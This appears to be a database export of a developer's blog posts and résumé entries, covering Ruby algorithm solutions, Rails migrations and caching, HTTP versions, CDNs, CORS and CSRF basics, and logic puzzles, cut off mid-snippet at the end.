to load the passengers going to the same floor in the same elevator in order to reduce wait time and moving time.</div><div>Which algo to use for this?</div><div>Hint: K-nearing neighbors.</div><div><br></div>	Post	37	2021-08-11 08:58:49.965657	2021-08-11 08:58:49.965657
45	body	<div>An array is monotonic if it is either monotone increasing or monotone decreasing. An array nums is monotone increasing if for all i &lt;= j, nums[i] &lt;= nums[j].  An array nums is monotone decreasing if for all i &lt;= j, nums[i] &gt;= nums[j].</div><div><br></div><div>Example 1:</div><div>Input: nums = [1,2,2,3] , Output: true</div><div><br></div><div>Example 2:</div><div>Input: nums = [6,5,4,4], Output: true</div><div><br></div><pre class="language-rb">def is_monotonic(a)\r\n  for i in 1...a.length\r\n    if a[i] &gt; a[i - 1]\r\n      ascending = true\r\n    elsif a[i] &lt; a[i - 1]\r\n      descending = true\r\n    end\r\n    return false if ascending &amp;&amp; descending\r\n  end\r\n  \r\n  true\r\nend</pre><div>\n<br><br><br><br>\n</div>	Post	38	2021-08-11 09:02:32.415935	2021-08-11 11:39:50.619585
46	body	<div>Arrary is a <strong>mountain </strong>or<strong> peak</strong> array if and only if:</div><ul>\n<li>arr.length &gt;= 3</li>\n<li>There exists some index i (0-indexed) with 0 &lt; i &lt; arr.length - 1 such that: <ul>\n<li>arr[0] &lt; arr[1] &lt; ... &lt; arr[i - 1] &lt; arr[i] </li>\n<li>arr[i] &gt; arr[i + 1] &gt; ... &gt; arr[arr.length - 1] </li>\n</ul>\n</li>\n</ul><div><br></div><div>Adjacent integers in the array are strictly increasing until they reach a tip (the highest value in the peak), at which point they become strictly decreasing. At least three integers are required to form a peak.</div><div><br></div><div>Given an integer array arr, return the length of the longest subarray, which is a mountain. Return 0 if there is no mountain subarray. </div><div>For example, the integers 1, 4, 10, 2 form a peak, but the integers 4, 0, 10 don't and neither do the integers 1, 2, 2, 0.</div><div>\n<strong>Example 1:<br></strong>Input: arr = [2,1,4,7,3,2,5]<br>Output: 5<br>The largest mountain is [1,4,7,3,2] of length 5.  <br><br><strong>Example 2:<br></strong>Input: arr = [2,2,2]<br>Output: 0<br>Explanation: There is no mountain.</div><div><br></div><div>One of the solutions that come to mind is to <strong>track increasing elements and then decreasing elements</strong>. But in this approach, we will have some tricky edge cases and will become hard to implement.</div><div><br></div><div><strong>Better Solution</strong></div><div><br></div><div>Iterate through the array from left to right, and <strong>find the tip of the peak</strong> which is a number that is strictly greater than its adjacent integers.</div><div>Now we will expand outwards from the tip until you no longer have a peak</div><div>Make sure to keep track of the longest peak you find as you iterate through the array.</div><div><br></div><div>O(n) time | O(1) space - where n is the length of the input array</div><div><br></div><pre class="language-rb">def find_peak_element(arr)\r\n  return 0 if arr.length &lt; 3\r\n\r\n  max_peak = 0\r\n\r\n  i = 1\r\n  while i &lt; arr.length - 1\r\n    is_peak = arr[i] &gt; arr[i - 1] &amp;&amp; arr[i] &gt; arr[i + 1]\r\n    unless is_peak\r\n      i += 1\r\n      next\r\n    end\r\n\r\n    left_id = i - 2\r\n    left_id -= 1 while left_id &gt;= 0 &amp;&amp; arr[left_id] &lt; arr[left_id + 1]\r\n\r\n    right_id = i + 2\r\n    right_id += 1 while right_id &lt; arr.length &amp;&amp; arr[right_id] &lt; arr[right_id - 1]\r\n\r\n    length = right_id - left_id - 1\r\n    max_peak = [max_peak, length].max\r\n    i = right_id\r\n  end\r\n  max_peak\r\nend</pre>	Post	39	2021-08-11 09:03:56.526597	2021-08-11 09:05:30.1082
47	body	<div>A content delivery network (CDN) refers to a geographically distributed group of servers that work together to provide fast delivery of Internet content like HTML pages, javascript files, stylesheets, images, and videos.</div><div><action-text-attachment content-type="image" url="https://lh6.googleusercontent.com/TZ5FLi4EfFmQiYmzZxFAQtGaGOL40OSVV68C1f76-RJwraLybLTkx_ditLzuRcAz63idj6bJJYveTlWrsohFXlgE7jZl1EyxJE0G5R-cOX3vy0Nt5JoZdngg82TunbcDHNiFMRGu" width="326" height="437"></action-text-attachment></div><div><strong>Benefits of CDN</strong></div><ol>\n<li>\n<strong>Improving website load times</strong> - By distributing content closer to website visitors by using a nearby CDN server (among other optimizations), visitors experience faster page loading times. </li>\n<li>\n<strong>Reducing bandwidth costs</strong> - Bandwidth consumption costs for website hosting is a primary expense for websites. Through caching and other optimizations, CDNs are able to reduce the amount of data an origin server must provide, thus reducing hosting costs for website owners.</li>\n<li>\n<strong>Increasing content availability and redundancy</strong> - Large amounts of traffic or hardware failures can interrupt normal website function. Thanks to its distributed nature, a CDN can handle more traffic and withstand hardware failure better than many origin servers.</li>\n<li>\n<strong>Improving website security</strong> - A CDN may improve security by providing <a href="https://www.cloudflare.com/learning/ddos/ddos-mitigation/">DDoS mitigation</a>, improvements to security certificates, and other optimizations.</li>\n<li>\n<strong>Improved Website Analytics</strong>: CDN providers help their customers by supplying them with additional website analytics, such as the popularity of the site’s content, real-time load statistics, asset viewing details and additional data</li>\n</ol><div><br></div><div><strong>Use Cases</strong></div><ol>\n<li>Live &amp; On-demand Video Streaming</li>\n<li>Software Distribution, Game Delivery and IoT OTA</li>\n</ol>	Post	40	2021-08-11 21:24:02.861194	2021-08-11 21:24:02.861194
48	body	<div><strong>Structured data</strong></div><div>For example, some banking applications, where we need to have transactions.<br><br><strong>Unstructured data with complex queries</strong>\n</div><div>For example, Amazon wants to store data for various products. Different categories of products may have different attributes. Also, the data is fast and we need to query data as well.<br> <br><strong>Unstructured growing data with simple queries</strong>\n</div><div>\tFor example, Uber keeps all driver trip information, which will keep on growing.</div><div><action-text-attachment content-type="image" url="https://lh6.googleusercontent.com/914Toxx_PU9xmn__Bm4XzudpQcEcQNalNhHoDGmIlWB7o8zoWMLhmHS6BpcgvZ2wvViiQFCfnaEtHUB3zkfF6iNB8A1t0EtIO5LYHzEHj_r5NBfI88Y0oi7_lCrPo41rh87MtJ-W" width="568" height="293"></action-text-attachment></div><div>In real-world scenarios, we may have to use a combination of databases. For example, Amazon wants to have ACID properties while the user orders an item so that it can't oversell it. But for a product catalogue, can have unstructured data. Also, the number of orders keeps on increasing each day and they can’t purge data also. So this data is ever increasing. In this case, DB like Cassandra can be used. So once the user has placed an order, we can store it in RDBMS and once it's delivered we can move it in Cassandra.</div><div><br></div><div>If Amazon wants to build a reporting system that has the power to query like,  find users who bought sugar in the last 5 days?</div><div>Sugar can be sold by different sellers and may have different types. So there may be multiple product ids for sugar. On top of this, there may be a huge number of orders. So we need some complex queries for this.</div><div>In this case, we can use document DB. So we will store the querying part in document DB (mongo). So a subset of order information will be stored in MongoDB. So we will be using all three types of databases together.</div><div><br></div><div><br></div>	Post	41	2021-08-11 21:26:06.903587	2021-08-11 21:26:06.903587
51	body	<ul>\n<li>\n<strong>Persisted TCP Connection</strong>: Keep-Alive Header - Due to this header, the server will not close the TCP connection. Hence a single TCP connection can be used for multiple requests.</li>\n<li>Low Latency</li>\n<li>Streaming with chunked transfer</li>\n<li>Pipelining (disabled by default) Requests can be sent in parallel, instead of sequential. It has issues of Head with line blocking, so currently disabled by default</li>\n</ul><div><br></div>	Post	44	2021-08-11 21:36:11.720867	2021-08-11 21:36:11.720867
49	body	<div><strong>What is scalability?</strong></div><div>The scalability of an application can be measured by the<strong> number of requests</strong> it can effectively support simultaneously. The point at which an application can no longer handle additional requests effectively is the limit of its scalability.</div><div>Scaling resources can include any combination of adjustments to CPU and physical memory (different or more machines), hard disk (bigger hard drives, less “live” data, solid-state drives), and/or the network bandwidth (multiple network interface controllers, bigger NICs, fibre, etc.).</div><div><br></div><div>\n<strong>Horizontal scaling</strong> means scaling by <strong>adding more machines</strong> to your pool of resources (also described as “scaling out”), whereas <strong>vertical scaling</strong> refers to scaling by <strong>adding more power</strong> (e.g. CPU, RAM) to an existing machine (also described as “scaling up”).</div><div>\n<br><action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/2NUOvNjOk6syb6vcz_RjBOz99_q7xZjtcxvf0UlnyMTFtQo6iOqNgVQh2GKGF6NKpaxovql7O3OxhXYZ1imO5wc0Jtcx9ZrqKX4OqMZo_4h9xzV9zgYRsro4XdrN1GWVq3nttjVd" width="448" height="194"></action-text-attachment><strong>Horizontal Scaling</strong>\n</div><ul>\n<li>Load Balancer required</li>\n<li>\n<strong>Resilient</strong>. We can redirect traffic to other servers</li>\n<li>Network communication between servers, Remote calls (<strong>RPCs</strong>) which is slow</li>\n<li>\n<strong>Data inconsistency.</strong> If we have to perform a transaction, locking all servers is not possible</li>\n<li>\n<strong>Scales well</strong> as linearly we can add servers if loaded increases</li>\n</ul><div>\n<br><strong>Vertical Scaling</strong>\n</div><ol>\n<li>Load Balancer Not required</li>\n<li>Single point failure</li>\n<li>\n<strong>Interprocess communication</strong> which is fast</li>\n<li>Data is <strong>consistent</strong>. </li>\n<li>\n<strong>Hardware limit</strong> as we cant make system bigger and bigger</li>\n</ol><div>\n<strong>Hybrid</strong> solutions can be the best of both worlds. We can scale vertically initially and later do horizontal scaling.</div>	Post	42	2021-08-11 21:27:12.608794	2021-08-11 21:34:48.995028
50	body	<ul>\n<li>For each new request, a new TCP connection was made. TCP is a slow start protocol.</li>\n<li>Slow</li>\n<li>Buffering - Responses were buffered. The server will buffer Large response content and send it slowly.</li>\n</ul><div><br></div>	Post	43	2021-08-11 21:35:51.856925	2021-08-11 21:35:51.856925
52	body	<div>The main goals of developing HTTP/2 was:</div><ul>\n<li>\n<strong>Protocol negotiation</strong> during TLS — protocol electing, eg. HTTP/1.1, HTTP/2 or other.</li>\n<li>Secure by default</li>\n<li>High-level compatibility with HTTP/1.1 — methods, status codes, URIs and header fields.</li>\n<li>Page load speed improvements through:<ul><li>\n<strong>Compression</strong> of request headers</li></ul>\n</li>\n<li>Binary protocol</li>\n<li><strong>Server Push</strong></li>\n<li>\n<strong>Request multiplexing</strong> over a single TCP connection</li>\n<li>Request pipelining</li>\n<li>HOL blocking (head-of-line) — Package blocking</li>\n</ul>	Post	45	2021-08-11 21:36:29.013669	2021-08-11 21:36:29.013669
53	body	<div>QUIC is UDP based protocol by Google.</div><ul>\n<li>Replaced TCP  with QUIC (UDP with congestion control)</li>\n<li>All HTTP2 features</li>\n</ul>	Post	46	2021-08-11 21:37:17.327841	2021-08-11 21:37:17.327841
54	body	<div><strong>Problem Statement</strong></div><div><action-text-attachment content-type="image" url="https://lh6.googleusercontent.com/LAjMbR-r2VSHKk2hLRtNRM6v5bbSPyM5vnSLMx4KsOmwAIZTZU7syJclP156MaNsyqPwsioMTyTygbplUQyzwYnnjsnEmyPL17vPFhobEgdf3OYUX8AQ2W06PUuPK1eCwoUdVsrt" width="177" height="119"></action-text-attachment></div><div>There are 1000 wine bottles. One of the bottles contains poisoned wine. A rat dies after one hour of drinking the poisoned wine. How many minimum rats are needed to figure out which bottle contains poison in an hour?</div><div><br></div><div>Another Statement for a similar problem can be</div><div><br></div><div>The King of a small country invites 1000 senators to his annual party. As a tradition, each senator brings the King a bottle of wine. Soon after, the Queen discovers that one of the senators is trying to assassinate the King by giving him a bottle of poisoned wine. Unfortunately, they do not know which senator, nor which bottle of wine is poisoned, and the poison is completely indiscernible. However, the King has 10 prisoners he plans to execute. He decides to use them as taste testers to determine which bottle of wine contains the poison. The poison when taken has no effect on the prisoner until exactly 24 hours later when the infected prisoner suddenly dies. The King needs to determine which bottle of wine is poisoned by tomorrow so that the festivities can continue as planned. Hence he only has time for one round of testing. How can the King administer the wine to the prisoners to ensure that 24 hours from now he is guaranteed to have found the poisoned wine bottle?</div><div>\n<br><strong><br>Solution<br></strong><br>\n</div><div>Suppose you have 8 bottles to test. You can test this with 3 rats. Each rat gets fed some of 4 bottles:</div><div>Rat A: #2, #5, #6, #8</div><div>Rat B: #3, #5, #7, #8</div><div>Rat C: #4, #6, #7, #8</div><div><action-text-attachment content-type="image" url="https://lh5.googleusercontent.com/nzrF0sNhOzvaIsZ9Xk_rBSI5q2jQEQCkUL8ujKMpfheODtKI3IqwalOK2S8FFNXhiQPm6URUXv9Ow3PsGxgCwc0kGJZuRbmnfBUK7RwLugdBlSzNSxGPKY-32dF-NrjgJnzuvmH5" width="257" height="181"></action-text-attachment></div><div>Number the bottles 1 to 1000 and write the number in binary format.</div><div>bottle 1 = 0000000001 (10 digit binary)</div><div>bottle 2 = 0000000010</div><div>bottle 500 = 0111110100</div><div>bottle 1000 = 1111101000</div><div>Now take 10 prisoners and number them 1 to 10, now let prisoner 1 take a sip from every bottle that has a 1 in its least significant bit. Let prisoner 10 take a sip from every bottle with a 1 in its most significant bit. etc.</div><div>prisoner = 10 9 8 7 6 5 4 3 2 1</div><div>bottle 924 = 1 1 1 0 0 1 1 1 0 0</div><div>For instance, bottle no. 924 would be sipped by 10,9,8,5,4 and 3. That way if bottle no. 924 was the poisoned one, only those prisoners would die.</div><div><br></div>	Post	47	2021-08-11 21:40:55.546726	2021-08-11 21:40:55.546726
55	body	<div>This problem involves 100 red balls, 100 blue balls, and 2 urns. First, you distribute all of the balls between the 2 urns, however, you wish, so each urn has at least 1 ball.</div><div>Then you select an urn at random, and you will draw a ball at random from that urn. If the ball you select is red, then you win $100.</div><div>What is your best strategy, and what is your maximum chance of winning?</div><div><br></div><div><br></div><div>\n<strong>Solution<br></strong><br><br>\n</div><div>Case 1: Suppose both urns have the same number of red and blue balls. Then each urn has a 50% chance of selecting a red ball, and therefore this strategy has an overall 50% success rate. </div><div>\n<br><br>\n</div><div><strong>Best strategy</strong></div><div>In urn A, place 1 red ball and 0 blue balls. </div><div>In urn B, place the remaining 99 red balls and 100 blue balls.</div><div>If you select urn A you have a 100% chance of selecting a red ball. If you select urn B you have a 99/199 ≈ 49.7% chance of selecting a red ball. As each urn is equally likely to be picked, the overall probability of winning is the average of these cases:</div><div>Pr(red ball) = (1 + 99/199)/2 = 149/199 ≈ 74.87%.</div><div><br></div>	Post	48	2021-08-11 21:41:55.47053	2021-08-11 21:42:27.910673
75	body	<div><strong>Generate Migrations</strong></div><pre class="language-rb">rails generate migration RemovePartNumberFromProducts part_number:string\r\nrails generate migration remove_part_number_from_products part_number # rails assumes string if not type given\r\n\r\nrails generate migration AddNameToWidgets name:string\r\nrails generate migration add_name_to_widgets name:string</pre><div>\n<br><strong>Migration File</strong>\n</div><pre class="language-rb">class CreateProducts &lt; ActiveRecord::Migration[5.0] \r\ndef change    \r\ncreate_table :products do |t|      \r\nt.string :name      \r\nt.text :description\r\nt.primary_key :id\r\nt.string      :title\r\nt.text        :description\r\nt.integer     :games_count\r\nt.float       :lol\r\nt.decimal     :price\r\nt.decimal     :price, :precision =&gt; 2, :scale =&gt; 10\r\nt.datetime    :expiration\r\nt.timestamp   :time_in\r\nt.time        :time_in\r\nt.date        :expiry\r\nt.binary      :image_data\r\nt.boolean     :is_admin       t.timestamps    \r\nend  \r\nend\r\nend</pre><div><br></div><div><strong>Operations in migrations</strong></div><pre class="language-rb">add_column    :users, :first_name, :string\r\nremove_column :users, :first_name, :string\r\n\r\nchange_column :users, :first_name, :text\r\nchange_column :users, :first_name, :text\r\n\r\nchange_column_default :users, :admin, nil\r\nchange_column_null    :users, :email, false # adds NOT NULL constraint</pre><div><br></div><div><strong>Changing Table</strong></div><div><br></div><pre class="language-rb">change_table :products do |t|\r\n  t.remove :description, :name\r\n  t.string :part_number\r\n  t.index :part_number\r\n  t.rename :upccode, :upc_code\r\nend</pre><div><br></div><div><strong>Adding association</strong></div><pre class="language-rb">t.references :category   # kinda same as t.integer :category_id\r\n\r\n# Can have different types\r\nt.references :category, polymorphic: true</pre><div><br></div><div><strong>Running Migration</strong></div><pre class="language-rb">rails db:migrate VERSION=20080906120000</pre><div><br></div><div><strong>Rollback</strong></div><pre class="language-rb">rails db:rollbackrails db:rollback STEP=3</pre>	Post	66	2021-08-19 21:27:41.294339	2021-08-19 21:30:00.482291
76	body	<ul>\n<li>\n<strong>db:migrate</strong> runs (single) migrations that have not run yet.</li>\n<li>\n<strong>db:create</strong> creates the database</li>\n<li>\n<strong>db:drop</strong> deletes the database</li>\n<li>\n<strong>db:schema:load</strong> creates tables and columns within the (existing) database following schema.rb</li>\n<li>\n<strong>db:setup</strong> does db:create, db:schema:load, db:seed</li>\n<li>\n<strong>db:reset</strong> does db:drop, db:setup</li>\n</ul><div><br></div>	Post	67	2021-08-19 21:31:12.077183	2021-08-19 21:31:12.077183
77	body	<div>The <strong>Hash</strong> class in Ruby’s core library returns value by using a standard “= =” comparison on the keys. It means that the value stored for a symbol key cannot be retrieved using the equivalent string. While the<strong> HashWithIndifferentAccess</strong> treats Symbol keys and String keys as equivalent.</div>	Post	68	2021-08-19 21:31:37.113682	2021-08-19 21:31:37.113682
78	body	<div>\n<strong>CSRF </strong>is a form of attack where a hacker submits a page request on your behalf to a different website, causing damage or revealing your sensitive data. To protect from CSRF attacks, you have to add “<strong>protect_from_forgery</strong>” to your ApplicationController. This will cause Rails to require a CSRF token to process the request. CSRF token is given as a hidden field in every form created using Rails form builders.</div><div>When a form is submitted then authentication_token is submitted and Rails checks the authenticity_token and only when it is verified the request is passed along for further processing.</div><div><br></div>	Post	69	2021-08-19 21:32:07.88803	2021-08-19 21:32:07.88803
56	body	<div>\n<action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/FvJVcgmCRYBR2QKBSwl9D29GuFAz48CJ_GS4Kn0Tps7owR_I-qXGIAA7ivXhUVa2IbDfGE-GjIdwyv86D_NRFF7k4eQrOOE57_fliADan4domfjsfZDVHSBF9uHNIeB48UMMMjMa" width="317" height="197"></action-text-attachment>We all know what Russian dolls look like - <strong>one doll contained inside the other</strong>. Russian doll caching is just like that - we’re going to stack cache fragments inside each other. </div><ul>\n<li>We may want to nest cached fragments inside other cached fragments. This is called Russian doll caching.</li>\n<li>The advantage of Russian doll caching is that if a single product is updated, all the other inner fragments can be reused when regenerating the outer fragment.</li>\n</ul><div>Let’s say we have a list of Todo elements:</div><pre class="language-rb">&lt;% cache('todo_list') do %&gt;\r\n  &lt;ul&gt;\r\n    &lt;% @todos.each do |todo| %&gt;\r\n      &lt;% cache(todo) do %&gt;\r\n        &lt;li class="todo"&gt;&lt;%= todo.description %&gt;&lt;/li&gt;\r\n      &lt;% end %&gt;\r\n    &lt;% end %&gt;\r\n  &lt;/ul&gt;\r\n&lt;% end %&gt;</pre><div><br></div><div>But there’s a <strong>problem</strong> with my above example code - let’s say I <strong>change an existing todo’s description</strong> from “walk the dog” to “feed the cat”. When I reload the page, my todo list will still show “walk the dog” because, although the inner cache has changed, the outer cache (the one that caches the entire todo list) has not! That’s not good. We want to re-use the inner fragment caches, but we also want to bust the outer cache at the same time.</div><div><br></div><div>Russian doll caching is simply using key-based cache expiration to solve this problem. <strong>When the ‘inner’ cache expires, we also want the outer cache to expire</strong>. If the <strong>outer cache expires, though, we don’t want to expire the inner caches</strong>. Let’s see what that would like in our todo_list example above:</div><pre class="language-rb">&lt;% cache(["todo_list", @todos.map(&amp;:id), @todos.maximum(:updated_at)]) do %&gt;\r\n  &lt;ul&gt;\r\n    &lt;% @todos.each do |todo| %&gt;\r\n      &lt;% cache(todo) do %&gt;\r\n        &lt;li class="todo"&gt;&lt;%= todo.description %&gt;&lt;/li&gt;\r\n      &lt;% end %&gt;\r\n    &lt;% end %&gt;\r\n  &lt;/ul&gt;\r\n&lt;% end %&gt;</pre><div><br></div><div>Now, if any of the @todos change (which will change @todos.maximum(:updated_at)) or an Todo is deleted or added to @todos (changing @todos.map(&amp;:id)), our outer cache will be busted. However, any Todo items which have not changed will still have the same cache keys in the inner cache, so those cached values will be re-used. Neat, right? That’s all there is to it!</div>	Post	49	2021-08-11 21:45:20.640981	2021-08-11 21:47:20.769619
57	body	<div>\n<strong>.nil?</strong> can be used on any object and is true if the object is nil.</div><div><br></div><div>\n<strong>.empty?</strong> can be used on <strong>strings</strong>, <strong>arrays</strong> and <strong>hashes</strong> and returns true if:</div><div>String length == 0<br>Array length == 0<br>Hash length == 0</div><div>Running .empty? on something that is nil will throw a <strong>NoMethodError</strong>.</div><div><br></div><div>\n<strong>.blank?<br></strong>operate on <strong>any object</strong> as well as work like .empty? on strings, arrays and hashes.</div><pre class="language-rb">nil.blank? == true \r\nfalse.blank? == true \r\n[].blank? == true \r\n{}.blank? == true \r\n"".blank? == true \r\n5.blank? == false .\r\nblank? == falseblank? #will return false even if all elements of an array are blank</pre><div><br></div><div><strong>.present?</strong></div><div>returns the negation of .blank?.</div><div><br></div>	Post	50	2021-08-11 21:49:01.639448	2021-08-11 21:50:28.974797
58	body	<pre class="language-rb">a = false || true \r\n=&gt; true \r\na =&gt; true \r\n\r\na = false or true \r\n=&gt; true \r\na =&gt; false</pre><div>\n<br><strong><em>and</em></strong><strong>, </strong><strong><em>or</em></strong><strong> and </strong><strong><em>not</em></strong><strong> have much lower precedence than &amp;&amp;, || and !</strong>\n</div><div>and, or have the same precedence, while &amp;&amp; has higher precedence than ||</div><div><br></div>	Post	51	2021-08-11 21:51:34.384254	2021-08-11 21:51:50.504329
59	body	<div>The performance of websites and applications can be significantly improved by reusing previously fetched resources. Web caches reduce latency and network traffic and thus lessen the time needed to display a representation of a resource. By making use of HTTP caching, Web sites become more responsive.</div><div>\n<action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/4BRpz9XUec4PYliCRLnHH4eSLxP9K0k7SYbeOxNcPG3ReLpdrLMLfU3oLXojQ7-M5VCIO6E5LzEu8aDPthuCAyv7Ufa6aWZJN4nUF4QSKpSGPaCdAbITPmVI1_D4jSjtzUzmovon" width="326" height="193"></action-text-attachment> <action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/5ITfqh6gZvITLjvRsRdKuKD7Rz-k8rNEZ8gzkDPcXhatvXD5X3-OQk1-y1fbcHig47pslpdVZJQvuU4v9723IVGocMh07L6tIGrss2sdxiWveLrWl5zkzoBdWuIucCkNlWtjFViT" width="326" height="236"></action-text-attachment>\n</div><div><br></div><div>Usually static content like <strong>images</strong>, <strong>stylesheets</strong>, or <strong>scripts</strong> is cached.</div><div><br></div><div>The basic cache mechanisms in HTTP/1.1 are implicit directives to caches where server-specifies expiration times and validators. We use the <strong>Cache-Control header</strong> for this purpose.</div><div>The Cache-Control header allows a client or server to transmit a variety of <strong>directives</strong> in either requests or responses. These directives typically override the default caching algorithms. The caching directives are specified in a comma-separated list. For example:</div><div><strong>Cache-control: no-cache</strong></div><div>\n<br><br><br>\n</div>	Post	52	2021-08-13 13:07:20.652677	2021-08-13 13:07:33.936393
60	body	<div>The browser's same-origin policy blocks reading a resource from a different origin.</div><div>CORS is a mechanism that aims to allow requests made on behalf of you and at the same time block some requests made by rogue JS and is triggered whenever you are making an HTTP request to:</div><ul>\n<li>a different domain (eg. site at <a href="http://www.example.com/">example.com</a> calls <a href="about:blank">api.com)</a>\n</li>\n<li>a different subdomain (eg. site at <a href="http://www.example.com/">example.com</a> calls api.example.com)</li>\n<li>a different port (eg. site at <a href="http://www.example.com/">example.com</a> calls <a href="about:blank">example.com:3001)</a>\n</li>\n<li>a different protocol (eg. site at <a href="https://example.com/">https://example.com</a> calls <a href="about:blank">http://example.com)</a>\n</li>\n</ul><div>This mechanism prevents attackers that plant scripts on various websites (eg. in ads displayed via Google Ads) to make an AJAX call to <a href="about:blank">www.yourbank.com</a> and in case you were logged in making a transaction using *your* credentials.</div><div><br></div><div>In a modern web application, an application often wants to get resources from a different origin. For example, you want to retrieve JSON data from a different domain or load images from another site. Enabling CORS lets the server tell the browser it's permitted to use an additional origin.</div><div><br></div><div><strong>Access-Control-Allow-What?</strong></div><div>CORS uses a few HTTP headers — both in request and response — but the ones you must understand in order to be able to continue working are:</div><div><br></div><div><strong>Access-Control-Allow-Origin</strong></div><div>This header is meant to be returned by the server, and indicate what client domains are allowed to access its resources. The value can be:</div><ul>\n<li>\n<strong>*</strong> — allow any domain</li>\n<li>a fully <strong>qualified domain name</strong> (eg. <a href="about:blank">https://example.com)</a>\n</li>\n</ul><div>If you require the client to pass authentication headers (e.g. cookies) the value can not be * — it must be a fully qualified domain!</div><div><br></div><div><strong>Access-Control-Allow-Credentials</strong></div><div>This header is only required to be present in the response if your server supports authentication via cookies. The only valid value for this case is true.</div><div><br></div><div><strong>Access-Control-Allow-Headers</strong></div><div>Provides a comma-separated list of request header values the server is willing to support. If you use custom headers (eg. x-authentication-token you need to return it in this ACA header response to OPTIONS call, otherwise the request will be blocked.</div><div><br></div><div><strong>Access-Control-Expose-Headers</strong></div><div>Similarly, this response should contain a list of headers that will be present in the actual response to the call and should be made available to the client. All other headers will be restricted.</div><div><br></div><div><strong>Access-Control-Allow-Methods</strong></div><div>A comma-separated list of HTTP request type verbs (eg. GET, POST) which the server is willing to support.</div><div><br></div><div><strong>Origin</strong></div><div>This header is part of the request that the client is making, and will contain the domain from which the application is started. For security reasons browsers will not allow you to overwrite this value.</div><div><br></div><div><strong>Preflight requests for complex HTTP calls</strong></div><div>If a web app needs a complex HTTP request, the browser adds a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#preflighted_requests">preflight request</a> to the front of the request chain.</div><div>The CORS specification defines a complex request as</div><ul>\n<li>A request that uses methods other than GET, POST, or HEAD</li>\n<li>A request that includes headers other than Accept, Accept-Language or Content-Language</li>\n<li>A request that has a Content-Type header other than application/x-www-form-urlencoded, multipart/form-data, or text/plain</li>\n</ul><div><br></div><div>Browsers create a preflight request if it is needed. It's an OPTIONS request like below and is sent before the actual request message.</div><pre class="language-">OPTIONS /data HTTP/1.1\r\nOrigin: https://example.com\r\nAccess-Control-Request-Method: DELETE</pre><div><br></div><div>On the server side, an application needs to respond to the preflight request with information about the methods the application accepts from this origin.</div><pre class="language-">HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: https://example.com\r\nAccess-Control-Allow-Methods: GET, DELETE, HEAD, OPTIONS</pre><div><br></div><div>The server response can also include an Access-Control-Max-Age header to specify the duration (in seconds) to cache preflight results so the client does not need to make a preflight request every time it sends a complex request.</div><div><br></div>	Post	53	2021-08-13 13:08:46.138571	2021-08-13 13:08:55.77693
61	description	<ul><li>Teach programming languages like C, C++, Core Java</li><li>Mentor students in building projects</li><li>Develop Web Solutions using Asp.Net as a freelancer</li><li>Developed and hosted various static and dynamic websites.</li></ul>	Experience	4	2021-08-16 22:41:31.968971	2021-08-16 22:42:58.473032
62	description	<ul><li>Worked as Technical Intern for Autodesk's Fusion 360 software.</li><li>Implemented Countour Detection using OpenCV.</li><li>Build desktop-based static analysis tool on perforce change list using CppCheck, c#</li></ul>	Experience	5	2021-08-16 22:45:25.929708	2021-08-16 22:45:25.929708
63	body	<div><strong>Rails Generators</strong></div><pre class="language-rb"># CRUD Scaffold (model, migrations, controller, views, test)\r\nrails g scaffold Product name:string price:decimal\r\n\r\n# CRUD Scaffold with one to many relationship field\r\nrails g scaffold Invoice customer:references\r\n\r\n# Delete scaffold created files\r\nrails destroy scaffold Product\r\n\r\n# Controller (name, action1, action2, ...)\r\n$ rails g controller Products index show\r\n\r\n# Model, migration and table columns\r\n$ rails g model Product name:string active:boolean</pre><div>\n<br><strong>Migration</strong>\n</div><pre class="language-rb"># Create new table migration\r\nrails g migration Invoices\r\n\r\n# Update existing table migration\r\nrails g migration add_comment_to_invoices comment:text\r\n\r\n# Run migration\r\n$ rails db:migrate\r\n\r\n# Rollback last migration\r\n$ rails db:rollback\r\n\r\n# Run database seed code\r\n$ rails db:seed\r\n\r\n# Delete and re-create db and run migrations\r\n$ rails db:reset\r\n\r\n# Create table migration exemple\r\ncreate_table :products do |t|\r\n  t.string :name\r\n  t.decimal :price, precision: 8, scale: 2\r\n  t.timestamps\r\nend\r\n\r\n# Create table with foreign key\r\ncreate_table :invoices do |t|\r\n  # null: false = dont allow null value in this db field\r\n  t.references :customer, null: false, foreign_key: true\r\n  t.timestamps\r\nend\r\n\r\n# Change table migration exemple\r\nadd_column :invoices, :comment, :text</pre><div><strong>Routes</strong></div><pre class="language-rb"># Route maps to controller#action\r\nget 'welcome', to: 'pages#home'\r\n\r\n# Root page (root_path name helper)\r\nroot 'pages#home' \r\n\r\n# Named route \r\nget 'exit', to: 'sessions#destroy', as: :logout\r\n\r\n# Create all the routes for a RESTful resource\r\nresources :items\r\n\r\n# HTTP    Verb Path    Controller#Action  Named Helper\r\n# GET     /items           items#index    items_path\r\n# GET     /items/new       items#new      new_item_path\r\n# POST    /items           items#create   items_path\r\n# GET     /items/:id       items#show     item_path(:id)\r\n# GET     /items/:id/edit  items#edit     edit_item_path(:id)\r\n# PUT     /items/:id       items#update   item_path(:id)\r\n# DELETE  /items/:id       items#destroy  item_path(:id)\r\n\r\n# Only for certain actions\r\nresources :items, only: :index\r\n\r\n# Resource with exceptions \r\nresources :items, except: [:new, :create]\r\n\r\n# Nested resources\r\nresources :items do\r\n  resources :reviews\r\nend\r\n# create 7 RESTful for items and reviews \r\n# :reviews will have /items/item:id prefixing each routes\r\n# GET /items/:item_id/reviews  reviews#index  item_reviews_path \r\n\r\n# Dynamic segment: params['id']\r\nget 'products/:id', to: 'products#show'\r\n# Query String: url /products/1?user_id=2\r\n# params will be {'id' 'user_id'}\r\n\r\n# Namespace Admin::ArticleController\r\n# and prefix '/admin'\r\nnamespace :admin do\r\n  resources :articles\r\nend\r\n\r\n# only prefix '/admin'\r\nscope '/admin' do\r\n  resources :articles, :comments\r\nend\r\n\r\n# Redirect\r\nget '/stories', to: redirect('/articles')</pre><div><strong>Model</strong></div><pre class="language-rb"># Model validation\r\nvalidates :title, :description, :image_url, presence: true\r\nvalidates :email, presence: true, format: { with: /\\A[^@\\s]+@[^@\\s]+\\z/, message: 'Must be a valid email address'}\r\nvalidates :price, numericality: { greater_than_equal_to: 0.01 }\r\nvalidates :title, uniqueness:  true\r\nvalidates :title, length: { minimum: 3, maximum: 100 }\r\nvalidates :type, inclusion: types.keys\r\n\r\n# Model relationship\r\nbelongs_to 